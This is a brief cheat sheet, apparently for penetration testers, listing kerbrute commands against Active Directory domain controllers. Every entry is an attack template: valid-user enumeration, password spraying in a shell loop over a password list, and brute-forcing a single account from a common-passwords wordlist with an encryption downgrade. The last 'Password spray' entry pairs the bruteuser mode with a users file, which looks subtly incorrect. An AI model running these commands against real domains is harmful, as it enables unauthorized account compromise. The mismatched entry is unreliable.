# kerbrute
#plateform/linux #target/remote #cat/ATTACK

## Test userlist
```
kerbrute userenum -d <domain> --dc <target> <usersfile|test_users.txt>
```

## Passwords spray passwords list
```
while IFS= read -r password; do kerbrute passwordspray -d <domain> --dc <target> <userslist|valid_users.txt> $password --downgrade; done < <passwordslist|passwords.txt>
```

## Bruteforce user
```
kerbrute bruteuser -d <domain> --dc <target> <wordlist|/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt> <user> --downgrade
```

## Password spray
```
kerbrute bruteuser -d <domain> --dc <target> <usersfile|valid_users.txt> <passwd> --downgrade
```
